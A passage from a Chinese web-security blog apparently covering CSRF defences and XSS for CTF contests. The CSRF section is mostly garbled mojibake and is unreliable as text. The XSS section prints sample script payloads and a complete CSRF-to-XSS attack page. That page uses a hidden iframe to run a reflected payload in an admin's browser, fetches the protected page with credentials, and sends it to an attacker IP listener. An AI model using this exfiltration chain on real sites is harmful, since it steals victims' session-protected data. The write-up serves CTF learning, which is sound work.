-<p>3銆侀殢鐫€瀵笴SRF婕忔礊鐮旂┒鐨勪笉鏂繁鍏ワ紝涓嶆柇娑岀幇鍑轰竴浜涗笓闂ㄩ拡瀵笴SRF婕忔礊杩涜妫€娴嬬殑宸ュ叿锛屽CSRFTester锛孋SRF Request Builder绛夈€備互CSRFTester宸ュ叿涓轰緥锛孋SRF婕忔礊妫€娴嬪伐鍏风殑娴嬭瘯鍘熺悊濡備笅:</p>
-<p>浣跨敤CSRFTester杩涜娴嬭瘯鏃讹紝棣栧厛闇€瑕佹姄鍙栨垜浠湪娴忚鍣ㄤ腑璁块棶杩囩殑鎵€鏈夐摼鎺ヤ互鍙婃墍鏈夌殑琛ㄥ崟绛変俊鎭紝鐒跺悗閫氳繃鍦–SRFTester涓慨鏀圭浉搴旂殑琛ㄥ崟绛変俊鎭紝閲嶆柊鎻愪氦锛岃繖鐩稿綋浜庝竴娆′吉閫犲鎴风璇锋眰銆�</p>
-<p>濡傛灉淇敼鍚庣殑娴嬭瘯璇锋眰鎴愬姛琚綉绔欐湇鍔″櫒鎺ュ彈锛屽垯璇存槑瀛樺湪CSRF婕忔礊锛屽綋鐒舵娆惧伐鍏蜂篃鍙互琚敤鏉ヨ繘琛孋SRF鏀诲嚮銆�</p>
-<hr>
-<h2 id="浜斻€丆SRF婕忔礊鐨勯槻寰�"><a href="#浜斻€丆SRF婕忔礊鐨勯槻寰�" class="headerlink" title="浜斻€丆SRF婕忔礊鐨勯槻寰�"></a>浜斻€丆SRF婕忔礊鐨勯槻寰�</h2><h3 id="1銆侀獙璇佺爜"><a href="#1銆侀獙璇佺爜" class="headerlink" title="1銆侀獙璇佺爜"></a>1銆侀獙璇佺爜</h3><p>==楠岃瘉鐮佽璁や负鏄鎶桟SRF鏀诲嚮鏈€绠€娲佽€屾湁鏁堢殑闃插尽鏂规硶銆�==</p>
-<p>CSRF鏀诲嚮鐨勮繃绋嬶紝寰€寰€鏄湪鐢ㄦ埛涓嶇煡鎯呯殑鎯呭喌涓嬫瀯閫犱簡缃戠粶璇锋眰銆傝€岄獙璇佺爜锛屽垯寮哄埗鐢ㄦ埛蹇呴』涓庡簲鐢ㄨ繘琛屼氦浜掞紝鎵嶈兘瀹屾垚鏈€缁堣姹傘€傚洜姝ゅ湪閫氬父鎯呭喌涓嬶紝楠岃瘉鐮佽兘澶熷緢濂藉湴閬忓埗CSRF鏀诲嚮銆�</p>
-<p>浣嗘槸楠岃瘉鐮佸苟闈炰竾鑳姐€傚緢澶氭椂鍊欙紝鍑轰簬鐢ㄦ埛浣撻獙鑰冭檻锛岀綉绔欎笉鑳界粰鎵€鏈夌殑鎿嶄綔閮藉姞涓婇獙璇佺爜銆傚洜姝わ紝楠岃瘉鐮佸彧鑳戒綔涓洪槻寰SRF鐨勪竴绉嶈緟鍔╂墜娈碉紝鑰屼笉鑳戒綔涓烘渶涓昏鐨勮В鍐虫柟妗堛€�</p>
-<h3 id="2銆佸湪璇锋眰鍦板潃涓坊鍔�-token-骞堕獙璇�"><a href="#2銆佸湪璇锋眰鍦板潃涓坊鍔�-token-骞堕獙璇�" class="headerlink" title="2銆佸湪璇锋眰鍦板潃涓坊鍔� token 骞堕獙璇�"></a>2銆佸湪璇锋眰鍦板潃涓坊鍔� token 骞堕獙璇�</h3><p>CSRF 鏀诲嚮涔嬫墍浠ヨ兘澶熸垚鍔燂紝鏄洜涓洪粦瀹㈠彲浠ュ畬鍏ㄤ吉閫犵敤鎴风殑璇锋眰锛岃璇锋眰涓墍鏈夌殑鐢ㄦ埛楠岃瘉淇℃伅閮芥槸瀛樺湪浜� cookie 涓紝鍥犳榛戝鍙互鍦ㄤ笉鐭ラ亾杩欎簺楠岃瘉淇℃伅鐨勬儏鍐典笅鐩存帴鍒╃敤鐢ㄦ埛鑷繁鐨� cookie 鏉ラ€氳繃瀹夊叏楠岃瘉銆�</p>
-<p>瑕佹姷寰� CSRF鍏抽敭鍦ㄤ簬鍦ㄨ姹備腑鏀惧叆榛戝鎵€涓嶈兘浼€犵殑淇℃伅锛屽苟涓旇淇℃伅涓嶅瓨鍦ㄤ簬 cookie 涔嬩腑銆�</p>
-<p><span data-type="text" style="color: var(--b3-font-color8);">鍙互鍦� HTTP 璇锋眰涓互鍙傛暟鐨勫舰寮忓姞鍏ヤ竴涓殢鏈轰骇鐢熺殑 token锛屽苟鍦ㄦ湇鍔″櫒绔缓绔嬩竴涓嫤鎴櫒鏉ラ獙璇佽繖token锛屽鏋滆姹備腑娌℃湁 token 鎴栬€� token 鍐呭涓嶆纭紝鍒欒涓哄彲鑳芥槸 CSRF 鏀诲嚮鑰屾嫆缁濊璇锋眰銆�</span></p>
-<p><img src="/assets/image-20250520025334-kgrwlzn.png" alt="image"></p>
-<p>杩欑鏂规硶瑕佹瘮妫€鏌� Referer瑕佸畨鍏ㄤ竴浜涳紝token 鍙互鍦ㄧ敤鎴风櫥闄嗗悗浜х敓骞舵斁浜� session 涔嬩腑锛岀劧鍚庡湪姣忔璇锋眰鏃舵妸 token 浠� session 涓嬁鍑猴紝涓庤姹備腑鐨� token 杩涜姣斿锛屼絾杩欑鏂规硶鐨勯毦鐐瑰湪浜庡浣曟妸 token 浠ュ弬鏁扮殑褰㈠紡鍔犲叆璇锋眰銆�</p>
-<p>瀵逛簬 GET 璇锋眰锛宼oken 灏嗛檮鍦ㄨ姹傚湴鍧€涔嬪悗锛岃繖鏍� URL 灏卞彉鎴� <a target="_blank" rel="noopener" href="http://url/?csrftoken=tokenvalue%E9%8A%86%EF%BF%BD">http://url?csrftoken=tokenvalue銆�</a> 鑰屽浜� POST 璇锋眰鏉ヨ锛岃鍦� form 鐨勬渶鍚庡姞涓� 锛岃繖鏍峰氨鎶� token 浠ュ弬鏁扮殑褰㈠紡鍔犲叆璇锋眰浜嗐€�</p>
-<p><span data-type="text" style="color: var(--b3-font-color9);">浣嗘槸锛屽湪涓€涓綉绔欎腑锛屽彲浠ユ帴鍙楄姹傜殑鍦版柟闈炲父澶氾紝瑕佸浜庢瘡涓€涓姹傞兘鍔犱笂 token 鏄緢楹荤儲鐨勶紝骞朵笖寰堝鏄撴紡鎺夛紝閫氬父浣跨敤鐨勬柟娉曞氨鏄湪姣忔椤甸潰鍔犺浇鏃讹紝浣跨敤 javascript 閬嶅巻鏁翠釜 dom 鏍戯紝瀵逛簬 dom 涓墍鏈夌殑 a 鍜� form 鏍囩鍚庡姞鍏� token銆�</span></p>
-<p>杩欐牱鍙互瑙ｅ喅澶ч儴鍒嗙殑璇锋眰锛屼絾鏄浜庡湪椤甸潰鍔犺浇涔嬪悗鍔ㄦ€佺敓鎴愮殑 html 浠ｇ爜锛岃繖绉嶆柟娉曞氨娌℃湁浣滅敤锛岃繕闇€瑕佺▼搴忓憳鍦ㄧ紪鐮佹椂鎵嬪姩娣诲姞 token銆�</p>
-<p>璇ユ柟娉曡繕鏈変竴涓己鐐规槸闅句互淇濊瘉 token 鏈韩鐨勫畨鍏ㄣ€傜壒鍒槸鍦ㄤ竴浜涜鍧涗箣绫绘敮鎸佺敤鎴疯嚜宸卞彂琛ㄥ唴瀹圭殑缃戠珯锛岄粦瀹㈠彲浠ュ湪涓婇潰鍙戝竷鑷繁涓汉缃戠珯鐨勫湴鍧€銆傜敱浜庣郴缁熶篃浼氬湪杩欎釜鍦板潃鍚庨潰鍔犱笂 token锛岄粦瀹㈠彲浠ュ湪鑷繁鐨勭綉绔欎笂寰楀埌杩欎釜 token锛屽苟椹笂灏卞彲浠ュ彂鍔� CSRF 鏀诲嚮銆�</p>
-<p><span data-type="text" style="color: var(--b3-font-color6);">涓轰簡閬垮厤杩欎竴鐐癸紝绯荤粺鍙互鍦ㄦ坊鍔� token 鐨勬椂鍊欏鍔犱竴涓垽鏂紝濡傛灉杩欎釜閾炬帴鏄摼鍒拌嚜宸辨湰绔欑殑锛屽氨鍦ㄥ悗闈㈡坊鍔� token锛屽鏋滄槸閫氬悜澶栫綉鍒欎笉鍔�</span></p>
-<p>涓嶈繃锛屽嵆浣胯繖涓� csrftoken 涓嶄互鍙傛暟鐨勫舰寮忛檮鍔犲湪璇锋眰涔嬩腑锛岄粦瀹㈢殑缃戠珯涔熷悓鏍峰彲浠ラ€氳繃 Referer 鏉ュ緱鍒拌繖涓� token 鍊间互鍙戝姩 CSRF 鏀诲嚮銆傝繖涔熸槸涓€浜涚敤鎴峰枩娆㈡墜鍔ㄥ叧闂祻瑙堝櫒 Referer 鍔熻兘鐨勫師鍥犮€�</p>
-<h3 id="3銆佸湪-HTTP-澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉"><a href="#3銆佸湪-HTTP-澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉" class="headerlink" title="3銆佸湪 HTTP 澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉"></a>3銆佸湪 HTTP 澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉</h3><p>杩欑鏂规硶涔熸槸浣跨敤 token 骞惰繘琛岄獙璇侊紝鍜屼笂涓€绉嶆柟娉曚笉鍚岀殑鏄紝杩欓噷骞朵笉鏄妸 token 浠ュ弬鏁扮殑褰㈠紡缃簬 HTTP 璇锋眰涔嬩腑锛岃€屾槸鎶婂畠鏀惧埌 HTTP 澶翠腑鑷畾涔夌殑灞炴€ч噷銆傞€氳繃 XMLHttpRequest 杩欎釜绫伙紝鍙互涓€娆℃€х粰鎵€鏈夎绫昏姹傚姞涓� csrftoken 杩欎釜 HTTP 澶村睘鎬э紝骞舵妸 token 鍊兼斁鍏ュ叾涓€�</p>
-<p>杩欐牱瑙ｅ喅浜嗕笂绉嶆柟娉曞湪璇锋眰涓姞鍏� token 鐨勪笉渚匡紝鍚屾椂锛岄€氳繃XMLHttpRequest 璇锋眰鐨勫湴鍧€涓嶄細琚褰曞埌娴忚鍣ㄧ殑鍦板潃鏍忥紝涔熶笉鐢ㄦ媴蹇� token 浼氶€忚繃 Referer 娉勯湶鍒板叾浠栫綉绔欎腑鍘汇€�</p>
-<blockquote>
-<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">鐒惰€岃繖绉嶆柟娉曠殑灞€闄愭€ч潪甯稿ぇ锛孹MLHttpRequest 璇锋眰閫氬父鐢ㄤ簬 Ajax 鏂规硶涓浜庨〉闈㈠眬閮ㄧ殑寮傛鍒锋柊锛屽苟闈炴墍鏈夌殑璇锋眰閮介€傚悎鐢ㄨ繖涓被鏉ュ彂璧凤紝鑰屼笖閫氳繃璇ョ被璇锋眰寰楀埌鐨勯〉闈笉鑳借娴忚鍣ㄦ墍璁板綍涓嬶紝浠庤€岃繘琛屽墠杩涳紝鍚庨€€锛屽埛鏂帮紝鏀惰棌绛夋搷浣滐紝缁欑敤鎴峰甫鏉ヤ笉渚裤€�</span></p>
-</blockquote>
-<p>鍙﹀锛屽浜庢病鏈夎繘琛� CSRF 闃叉姢鐨勯仐鐣欑郴缁熸潵璇达紝瑕侀噰鐢ㄨ繖绉嶆柟娉曟潵杩涜闃叉姢锛岃鎶婃墍鏈夎姹傞兘鏀逛负 XMLHttpRequest 璇锋眰锛岃繖鏍峰嚑涔庢槸瑕侀噸鍐欐暣涓綉绔欙紝杩欎唬浠锋棤鐤戞槸涓嶈兘鎺ュ彈鐨勩€�</p>
-<h3 id="4銆侀獙璇�-HTTP-Referer-瀛楁"><a href="#4銆侀獙璇�-HTTP-Referer-瀛楁" class="headerlink" title="4銆侀獙璇� HTTP Referer 瀛楁"></a>4銆侀獙璇� HTTP Referer 瀛楁</h3><p>鏍规嵁 HTTP 鍗忚锛屽湪 HTTP 澶翠腑鏈変竴涓瓧娈靛彨Referer锛屽畠璁板綍浜嗚 HTTP 璇锋眰鐨勬潵婧愬湴鍧€銆傚湪閫氬父鎯呭喌涓嬶紝璁块棶涓€涓畨鍏ㄥ彈闄愰〉闈㈢殑璇锋眰鏉ヨ嚜浜庡悓涓€涓綉绔欙紝姣斿闇€瑕佽闂� 锛�</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;<span class="keyword">for</span>=Mallory</span><br></pre></td></tr></table></figure>
-
-<p>鐢ㄦ埛蹇呴』鍏堢櫥闄� bank.example锛岀劧鍚庨€氳繃鐐瑰嚮椤甸潰涓婄殑鎸夐挳鏉ヨЕ鍙戣浆璐︿簨浠躲€�</p>
-<p>杩欐椂锛岃杞笎璇锋眰鐨� Referer 鍊煎氨浼氭槸杞处鎸夐挳鎵€鍦ㄧ殑椤甸潰鐨� URL锛岄€氬父鏄互 bank.example 鍩熷悕寮€澶寸殑鍦板潃銆傝€屽鏋滈粦瀹㈣瀵归摱琛岀綉绔欏疄鏂� CSRF 鏀诲嚮锛屼粬鍙兘鍦ㄤ粬鑷繁鐨勭綉绔欐瀯閫犺姹傦紝褰撶敤鎴烽€氳繃榛戝鐨勭綉绔欏彂閫佽姹傚埌閾惰鏃讹紝璇ヨ姹傜殑 Referer 鏄寚鍚戦粦瀹㈣嚜宸辩殑缃戠珯銆�</p>
-<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">鍥犳锛岃闃插尽 CSRF 鏀诲嚮锛岄摱琛岀綉绔欏彧闇€瑕佸浜庢瘡涓€涓浆璐﹁姹傞獙璇佸叾 Referer 鍊硷紝濡傛灉鏄互 bank.example 寮€澶寸殑鍩熷悕锛屽垯璇存槑璇ヨ姹傛槸鏉ヨ嚜閾惰缃戠珯鑷繁鐨勮姹傦紝鏄悎娉曠殑銆傚鏋� Referer 鏄叾浠栫綉绔欑殑璇濓紝鍒欐湁鍙兘鏄粦瀹㈢殑 CSRF 鏀诲嚮锛屾嫆缁濊璇锋眰銆�</span></p>
-<p>鈥�</p>
-<p>杩欑鏂规硶鐨勬樉鑰屾槗瑙佺殑濂藉灏辨槸绠€鍗曟槗琛岋紝缃戠珯鐨勬櫘閫氬紑鍙戜汉鍛樹笉闇€瑕佹搷蹇� CSRF 鐨勬紡娲烇紝鍙渶瑕佸湪鏈€鍚庣粰鎵€鏈夊畨鍏ㄦ晱鎰熺殑璇锋眰缁熶竴澧炲姞涓€涓嫤鎴櫒鏉ユ鏌� Referer 鐨勫€煎氨鍙互銆傜壒鍒槸瀵逛簬褰撳墠鐜版湁鐨勭郴缁燂紝涓嶉渶瑕佹敼鍙樺綋鍓嶇郴缁熺殑浠讳綍宸叉湁浠ｇ爜鍜岄€昏緫锛屾病鏈夐闄╋紝闈炲父渚挎嵎銆�</p>
-<p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">鐒惰€岋紝杩欑鏂规硶骞堕潪涓囨棤涓€澶便€俁eferer 鐨勫€兼槸鐢辨祻瑙堝櫒鎻愪緵鐨勶紝铏界劧 HTTP 鍗忚涓婃湁鏄庣‘鐨勮姹傦紝浣嗘槸姣忎釜娴忚鍣ㄥ浜� Referer 鐨勫叿浣撳疄鐜板彲鑳芥湁宸埆锛屽苟涓嶈兘淇濊瘉娴忚鍣ㄨ嚜韬病鏈夊畨鍏ㄦ紡娲炪€�</span></p>
-<p>浣跨敤楠岃瘉 Referer 鍊肩殑鏂规硶锛屽氨鏄妸瀹夊叏鎬ч兘渚濊禆浜庣涓夋柟锛堝嵆娴忚鍣級鏉ヤ繚闅滐紝浠庣悊璁轰笂鏉ヨ锛岃繖鏍峰苟涓嶅畨鍏ㄣ€�</p>
-<p>浜嬪疄涓婏紝瀵逛簬鏌愪簺娴忚鍣紝姣斿 IE6 鎴� FF2锛岀洰鍓嶅凡缁忔湁涓€浜涙柟娉曞彲浠ョ鏀� Referer 鍊笺€傚鏋� bank.example 缃戠珯鏀寔 IE6 娴忚鍣紝榛戝瀹屽叏鍙互鎶婄敤鎴锋祻瑙堝櫒鐨� Referer 鍊艰涓轰互 bank.example 鍩熷悕寮€澶寸殑鍦板潃锛岃繖鏍峰氨鍙互閫氳繃楠岃瘉锛屼粠鑰岃繘琛� CSRF 鏀诲嚮銆�</p>
-<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">鍗充究鏄娇鐢ㄦ渶鏂扮殑娴忚鍣紝榛戝鏃犳硶绡℃敼 Referer 鍊硷紝杩欑鏂规硶浠嶇劧鏈夐棶棰樸€傚洜涓� Referer 鍊间細璁板綍涓嬬敤鎴风殑璁块棶鏉ユ簮锛屾湁浜涚敤鎴疯涓鸿繖鏍蜂細渚电姱鍒颁粬浠嚜宸辩殑闅愮鏉冿紝鐗瑰埆鏄湁浜涚粍缁囨媴蹇� Referer 鍊间細鎶婄粍缁囧唴缃戜腑鐨勬煇浜涗俊鎭硠闇插埌澶栫綉涓€�</span></p>
-<p>鍥犳锛岀敤鎴疯嚜宸卞彲浠ヨ缃祻瑙堝櫒浣垮叾鍦ㄥ彂閫佽姹傛椂涓嶅啀鎻愪緵 Referer銆傚綋浠栦滑姝ｅ父璁块棶閾惰缃戠珯鏃讹紝缃戠珯浼氬洜涓鸿姹傛病鏈� Referer 鍊艰€岃涓烘槸 CSRF 鏀诲嚮锛屾嫆缁濆悎娉曠敤鎴风殑璁块棶銆�</p>
-<p>鎬荤粨<br>CSRF鏀诲嚮鏄敾鍑昏€呭埄鐢ㄧ敤鎴风殑韬唤鎿嶄綔鐢ㄦ埛璐︽埛鐨勪竴绉嶆敾鍑绘柟寮忋€傝璁SRF鐨勯槻寰℃柟妗堝繀椤诲厛鐞嗚ВCSRF鏀诲嚮鐨勫師鐞嗗拰鏈川銆傛垜浠€氬父浣跨敤Anti CSRF Token鏉ラ槻寰SRF鏀诲嚮锛屽湪浣跨敤Token鏃讹紝瑕佹敞鎰廡oken鐨勪繚瀵嗘€у拰闅忔満鎬с€�</p>
-</script></iframe></image></p>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/CSRF/" data-id="cmaxygi0e0001oc7k9o9k51ep" data-title="CSRF" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/05/20/Web/XSS/" class="article-date">
-  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/05/20/Web/XSS/">XSS跨站脚本攻击</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><blockquote>
-<p>跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种常见的 Web 漏洞，利用该漏洞，攻击者可以在受害者浏览器中注入并执行恶意脚本。在 CTF（Capture The Flag）竞赛中，XSS 攻击不仅是一种考察 Web 安全基础的攻击技术，同时也是非常实用的进阶手段，可以用来窃取敏感信息、绕过访问控制或结合 CSRF（跨站请求伪造）实现更复杂的链式攻击。</p>
-<p>本文将介绍 XSS 攻击的基本原理、常见类型、如何在 CTF 中利用 XSS 攻击，以及防御措施。</p>
-</blockquote>
-<h3 id="一、XSS-攻击基本原理"><a href="#一、XSS-攻击基本原理" class="headerlink" title="一、XSS 攻击基本原理"></a>一、XSS 攻击基本原理</h3><h4 id="1-什么是-XSS？"><a href="#1-什么是-XSS？" class="headerlink" title="1. 什么是 XSS？"></a>1. 什么是 XSS？</h4><blockquote>
-<p>XSS 攻击指的是攻击者通过在 Web 页面中注入恶意 JavaScript 代码，使得这些代码在其他用户的浏览器中执行。通过这种方式，攻击者可以篡改页面内容、窃取用户 Cookie、劫持用户会话，甚至对用户进行钓鱼攻击。</p>
-</blockquote>
-<h4 id="2-XSS-的类型"><a href="#2-XSS-的类型" class="headerlink" title="2. XSS 的类型"></a>2. XSS 的类型</h4><ul>
-<li><p><strong>反射型 XSS（Reflected XSS）：</strong><br>攻击者将恶意脚本嵌入到请求中，目标服务器将其反射到响应中。例如，通过 URL 参数传入恶意代码，目标页面在渲染时执行了该代码。</p>
-</li>
-<li><p><strong>存储型 XSS（Stored XSS）：</strong><br>恶意代码被永久存储在服务器上（例如数据库、留言板），当其他用户访问包含该内容的页面时，恶意代码被执行。</p>
-</li>
-<li><p><strong>DOM 型 XSS：</strong><br>恶意代码完全在客户端执行，通过修改页面的 DOM 结构，攻击者利用 JavaScript 动态修改页面内容，从而引发 XSS 漏洞。</p>
-</li>
-</ul>
-<p>‍</p>
-<h3 id="二、CTF-中的-XSS-攻击"><a href="#二、CTF-中的-XSS-攻击" class="headerlink" title="二、CTF 中的 XSS 攻击"></a>二、CTF 中的 XSS 攻击</h3><blockquote>
-<p>在 CTF 中，XSS 攻击通常不是为了破坏 Web 应用，而是为了获得 flag。CTF 赛题往往会设置一些特定的场景，例如存储型 XSS、反射型 XSS 或利用 CSRF 触发 XSS 链，以考察参赛者对 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Web%20%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">Web 漏洞</a>利用链的理解和实践能力。</p>
-</blockquote>
-<p>‍</p>
-<h4 id="1-反射型-XSS-示例"><a href="#1-反射型-XSS-示例" class="headerlink" title="1. 反射型 XSS 示例"></a>1. 反射型 XSS 示例</h4><p>在反射型 XSS 题目中，用户提交的输入（例如 URL 参数、表单数据）被直接反射到页面中。如果输入没有经过充分过滤，攻击者可以构造如下 URL：</p>
-<p>​<code>http://example.com/search?query=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>​</p>
-<p><a href="http://example.com/search?query=">http://example.com/search?query=</a><script>alert&#39;XSS&#39;)</script></p>
-<h4 id="2-存储型-XSS-示例"><a href="#2-存储型-XSS-示例" class="headerlink" title="2. 存储型 XSS 示例"></a>2. 存储型 XSS 示例</h4><p>存储型 XSS 攻击中，攻击者提交的数据被存储在服务器上。当其他用户（例如管理员或特定用户）访问含有该数据的页面时，恶意代码会被执行。例如，攻击者在论坛留言中提交：</p>
-<p>​<code>&lt;script&gt;alert(&#39;PWNED&#39;);&lt;/script&gt;</code>​</p>
-<p>当管理员查看留言时，浏览器执行这段代码，攻击者可以利用此漏洞进一步窃取管理员信息或执行其他操作。</p>
-<h4 id="3-CSRF-与-XSS-的结合"><a href="#3-CSRF-与-XSS-的结合" class="headerlink" title="3. CSRF 与 XSS 的结合"></a>3. CSRF 与 XSS 的结合</h4><p>CTF 题目中，有时会将 CSRF 与 XSS 攻击结合起来，形成攻击链。例如：</p>
-<ul>
-<li><p>利用 CSRF 诱使管理员访问一个恶意页面（由攻击者控制）。</p>
-</li>
-<li><p>恶意页面通过反射型 XSS 载荷，让管理员的浏览器执行 JavaScript 代码。</p>
-</li>
-<li><p>利用 JavaScript 内部的 fetch() 请求获取管理员专属的页面内容（例如包含 flag 的页面）。</p>
-</li>
-<li><p>最终将页面内容通过 exfiltration（数据外泄）的方式发送到攻击者服务器。</p>
-</li>
-</ul>
-<p>这种 CSRF→XSS 链可以绕过 HttpOnly cookie 限制，因为一旦脚本在管理员浏览器中执行，它就能读取同源下的所有页面内容。</p>
-<hr>
-<h3 id="三、实战案例"><a href="#三、实战案例" class="headerlink" title="三、实战案例"></a>三、实战案例</h3><p>下面是一段示例代码，展示如何利用 CSRF-to-XSS 链来获取 flag。假设目标应用使用 Flask 开发，管理员的 flag 隐藏在一个草稿帖子中，只有在发布后才能完整显示，而管理员默认不会发布草稿。</p>
-<p>攻击思路如下：</p>
-<ol>
-<li>利用 CSRF 让管理员的浏览器访问一个恶意页面（由攻击者托管）。</li>
-<li>恶意页面反射 XSS 负载，利用 fetch() 请求目标页面（例如首页 &#x2F;），读取包含 flag 的 HTML 内容。</li>
-<li>利用 new Image().src 将获取到的数据以 GET 请求形式 exfiltrate 到攻击者服务器。</li>
-</ol>
-<p><strong>示例恶意页面代码：</strong></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF to XSS Attack: Publish Admin Draft<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Triggering CSRF-to-XSS Attack<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Construct the XSS payload.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Dynamically construct the closing tag to avoid breaking the script.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> payload = <span class="string">`&lt;scr`</span> + <span class="string">`ipt&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      // Use fetch() to retrieve the protected page (which now shows the full flag).</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      fetch(&quot;http://challenge.localhost/&quot;, &#123; credentials: &quot;include&quot; &#125;)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .then(response =&gt; response.text())</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .then(data =&gt; &#123;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          // Exfiltrate the data to the attacker&#x27;s server.</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          var exfilUrl = &quot;http://10.17.108.216:8888/?flag=&quot; + encodeURIComponent(data);</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          new Image().src = exfilUrl;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &#125;)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .catch(error =&gt; console.error(&quot;Fetch error:&quot;, error));</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    &lt;/scr`</span> + <span class="string">`ipt&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// URL-encode the payload.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> encodedPayload = <span class="built_in">encodeURIComponent</span>(payload);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Build the target URL using the /ephemeral endpoint, which reflects the msg parameter.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> targetUrl = <span class="string">&quot;http://challenge.localhost/ephemeral?msg=&quot;</span> + encodedPayload;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Create a hidden iframe to force admin&#x27;s browser to load the target URL and execute the payload.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">src</span> = targetUrl;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>说明：</strong></p>
-<ul>
-<li><p>将 <code>http://10.17.108.216:8888/</code>​ 替换为你攻击机的实际 IP 和监听端口。</p>
-</li>
-<li><p>当管理员（通过 victim 工具登录 admin）访问这个页面时，iframe 会加载 <code>http://challenge.localhost/ephemeral?msg=...</code>​，反射出 XSS 负载。</p>
